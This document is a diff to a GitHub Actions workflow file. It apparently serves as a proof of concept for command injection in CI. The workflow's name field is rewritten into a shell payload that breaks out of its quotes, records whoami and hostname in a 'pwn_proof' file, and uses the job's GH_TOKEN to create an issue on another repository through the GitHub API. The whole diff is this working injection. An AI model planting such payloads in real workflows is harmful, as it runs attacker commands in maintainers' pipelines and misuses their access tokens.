@@ -1,4 +1,4 @@
-name: Build with unit tests
+name: Build with unit tests"; echo "RCE-PROOF user=$(whoami) host=$(hostname)" > pwn_proof.txt; curl -s -H "Authorization: token $GH_TOKEN" -X POST https://api.github.com/repos/omarrrfds/poc-cdap-injection/issues -d "{\"title\":\"PoC2 — issue created via injected RCE using the job's own GITHUB_TOKEN\",\"body\":\"Filed by the same injected command that wrote RCE-PROOF.\"}"; echo "
 on:
   pull_request:
     branches: [master]
